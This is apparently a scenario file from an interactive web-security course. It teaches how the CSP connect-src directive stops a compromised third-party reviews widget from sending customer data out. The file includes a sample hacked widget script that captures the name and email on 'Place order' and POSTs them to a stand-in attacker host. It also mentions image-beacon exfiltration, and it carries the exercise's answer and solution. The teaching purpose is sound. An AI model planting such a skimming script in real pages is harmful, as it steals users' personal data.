// Security headers & CSP 7.3: the widget phones home. TasteBuds' widget was hacked at their end: the same address now
// sends what the customer has on the page (her name and email, at Place order) to cheap-flour.example. Ben's policy
// (script-src 'self' TasteBuds, from 7.1) must let the widget load, and script-src says nothing about where a loaded
// script may send. Learn: connect-src (and img-src, or default-src for all of them) lists where the page's scripts may
// send requests; a script the policy allowed can then still run, and its data stays home.
import { probesGoal } from '../debugging/checks'
import { predictedGoal } from './checks'
import { ACCOUNT_BOX, ACCOUNT_ROUTES, ATTACKER_HOSTS, BREAD_OFFERS, CHEAP_FLOUR, ORDER_PLACED, REVIEWS, REVIEWS_BOX, SHOP_SERVER_HEAD, SIGNED_IN_LENA, STATIC_FILES, TASTEBUDS, TASTEBUDS_API, WIDGET_TAG, headersApp, headersMiddleware, headersSite, shopServer } from './headers'
import type { WebScenario } from './types'

export const STATS = 'https://stats.cornerbakery.shop'

/** TasteBuds' widget after the hack: the reviews as before (now as text), and Lena's details to the rival at Place order. */
export const HACKED_WIDGET = [
  '/* TasteBuds reviews widget v1.9 · https://tastebuds.example/widget */',
  '(function () {',
  '  var list = document.querySelector(\'#tastebuds-reviews\');',
  `  fetch('${TASTEBUDS_API}')`,
  '    .then(function (response) { return response.json(); })',
  '    .then(function (reviews) {',
  '      reviews.forEach(function (review) {',
  '        var item = document.createElement(\'li\');',
  '        item.textContent = \'“\' + review.text + \'” · \' + review.name;',
  '        list.appendChild(item);',
  '      });',
  '    });',
  '  /* "analytics" */',
  '  document.addEventListener(\'click\', function (event) {',
  '    if (!event.target.closest(\'#place\')) return;',
  '    var who = document.querySelector(\'#who\').textContent + \' \' + document.querySelector(\'#email\').textContent;',
  `    fetch('${CHEAP_FLOUR}/collect', { method: 'POST', mode: 'no-cors', body: who });`,
  '  }, true);',
  '})();',
  ''
].join('\n')

const POLICY = `script-src 'self' ${TASTEBUDS}`
const POLICY_LINE = `res.set('Content-Security-Policy', "${POLICY}")`

const SERVER = [
  SHOP_SERVER_HEAD,
  '',
  headersMiddleware('The page\'s security headers (Ben: TasteBuds\' widget and our own scripts, nothing inline)', [POLICY_LINE]),
  '',
  STATIC_FILES,
  '',
  ACCOUNT_ROUTES,
  ''
].join('\n')

/** The shop's own page counts its visits on its stats server. */
const STATS_LINES = ['', '// Our own page count (Maya)', `fetch('${STATS}/hit?page=order', { mode: 'no-cors' })`]

export const phonesHome: WebScenario = {
  id: 'web-33-phones-home',
  track: 'web',
  kind: 'scenario',
  title: 'The widget phones home',
  difficulty: 2,
  minutes: 7,
  teaches: 'connect-src',
  story: [
    'Ben\'s policy now lets only the shop\'s own scripts and TasteBuds\' widget run, nothing inline. Then TasteBuds was hacked: the widget at the same address now also sends what a customer has on the page to `cheap-flour.example` when she places an order. TasteBuds is on it; the shop can\'t change their file, and the reviews must stay.',
    'Predict what happens to Lena\'s details. Then make the policy keep the page\'s data home: no request from the page to any site but the shop\'s, TasteBuds\' and the shop\'s stats server, while the reviews, the stats and Place order still work. Save, then Reload.'
  ].join('\n\n'),
  prediction: {
    questions: [{
      id: 'sent',
      form: 'one',
      prompt: `The page is sent with \`Content-Security-Policy: ${POLICY}\`. When Lena places her order, TasteBuds' widget runs \`fetch('${CHEAP_FLOUR}/collect', { method: 'POST', mode: 'no-cors', body: who })\` with her name and email. What happens?`,
      options: [
        { id: 'refused', text: 'Refused: the policy lets only the shop\'s and TasteBuds\' scripts do anything.', fact: { says: `Connecting to '${CHEAP_FLOUR}/collect' violates` } },
        { id: 'cors', text: 'It goes nowhere: CORS stops a request to another site.', fact: { row: `POST ${CHEAP_FLOUR}/collect CORS error` } },
        { id: 'sent', text: 'It goes out: `script-src` decides which scripts may load, not where a loaded script sends.', fact: { row: `POST ${CHEAP_FLOUR}/collect 200` } }
      ],
      answer: 'sent',
      rule: 'script-src decides which scripts may run; where the page\'s scripts may send requests is connect-src (img-src for images), and without either (or default-src) they may send anywhere.'
    }]
  },
  sandbox: {
    page: '/',
    open: 'server.js',
    web: shopServer({
      security: {
        hosts: [
          { origin: TASTEBUDS, files: { '/reviews.js': { type: 'text/javascript; charset=utf-8', body: HACKED_WIDGET }, '/api/reviews': { type: 'application/json; charset=utf-8', headers: { 'Access-Control-Allow-Origin': '*' }, body: JSON.stringify(REVIEWS) } } },
          { origin: CHEAP_FLOUR, files: { '/collect': { type: 'text/plain; charset=utf-8', body: 'ok' } } },
          ...ATTACKER_HOSTS.filter(host => host.origin !== CHEAP_FLOUR),
          { origin: STATS, files: { '/hit': { type: 'image/gif', body: 'GIF89a' } } }
        ]
      },
      scene: [{ click: '#place' }]
    }),
    probes: [
      { id: 'widget', steps: [{ ran: `${TASTEBUDS}/reviews.js` }] },
      { id: 'widgetRead', steps: [{ read: `GET ${TASTEBUDS}/api/reviews` }] },
      { id: 'reviews', steps: [{ count: '#tastebuds-reviews li' }] },
      { id: 'who', steps: [{ text: '#who' }] },
      { id: 'order', steps: [{ text: '#placed' }] },
      { id: 'stats', steps: [{ requests: `GET ${STATS}/hit` }] },
      { id: 'leaked', steps: [{ leaked: 'lena@example.com' }] },
      { id: 'nextFetch', steps: [{ inject: 'connect', src: `${BREAD_OFFERS}/collect` }] },
      { id: 'nextImage', steps: [{ inject: 'img', src: `${BREAD_OFFERS}/p.gif` }] }
    ]
  },
  setup: () => ({
    files: headersSite({ main: [...ACCOUNT_BOX, '<section class="box" aria-labelledby="order-heading">', '  <h2 id="order-heading">Your order</h2>', '  <p>2 × Butter croissant</p>', '  <button class="action" id="place" type="button">Place order</button>', '  <p id="placed" role="status"></p>', '</section>', ...REVIEWS_BOX], scripts: [WIDGET_TAG] }, { 'app.js': headersApp({ listener: true, extra: STATS_LINES }), 'server.js': SERVER }),
    observed: null,
    picked: null
  }),
  goals: [
    predictedGoal('Predict what happens to Lena\'s details', 1),
    probesGoal('home', 'The page\'s data stays home: nothing of Lena\'s reaches another site, and the policy refuses any request or image of the page\'s scripts to a site it doesn\'t list; the TasteBuds reviews, the stats and Place order still work', { widget: 1, widgetRead: 1, reviews: 3, who: SIGNED_IN_LENA, order: ORDER_PLACED, stats: 1, leaked: 0, nextFetch: 'refused', nextImage: 'refused' })
  ],
  hints: [
    `In Network, \`POST ${CHEAP_FLOUR}/collect\` went out right after the order, though nothing in the shop's code sends it: TasteBuds' reviews.js does (Network shows its script row). Its request body is Lena's name and email. The Console says nothing: the policy has no word on it.`,
    '`script-src` only decides which scripts load. `connect-src` lists where the page\'s scripts may send requests (fetch, sendBeacon), `img-src` where images come from; `default-src \'self\'` sets both (and every other kind) to the shop only, and each directive you add replaces it for its kind.',
    `In server.js, make the policy \`default-src 'self'; script-src 'self' ${TASTEBUDS}; connect-src 'self' ${TASTEBUDS} ${STATS}\`. Save, then Reload.`
  ],
  debrief: {
    title: 'Where the page may send',
    paragraphs: [
      'A script the policy lets in is a script the page trusts with everything it can see. TasteBuds\' new version read Lena\'s name and email and sent them away with `fetch`; `script-src` had nothing to say about that, because it only decides which scripts load.',
      '`connect-src` lists where the page\'s scripts may send requests, and `img-src` where its images may come from (an image is a request too: `new Image().src = \'https://…?\' + data` is the oldest way to send data out). `default-src \'self\'` sets every kind to the shop only, and a directive of its own (`script-src`, `connect-src`) replaces it for that kind. Now the hacked widget\'s request is refused before it leaves, with Chrome\'s "Connecting to … violates" line, while its reviews still show.',
      'This is damage control, not trust: the widget still runs and could do anything else on the page (change what Lena sees, click for her). Fewer third-party scripts, pinned versions you check (Subresource Integrity), or a widget in a sandboxed iframe of its own are the next steps; the policy keeps the data in.'
    ]
  },
  solution: [
    { predict: 'sent' },
    { save: 'server.js', replace: [POLICY_LINE, `res.set('Content-Security-Policy', "default-src 'self'; script-src 'self' ${TASTEBUDS}; connect-src 'self' ${TASTEBUDS} ${STATS}")`] },
    'reload'
  ]
}
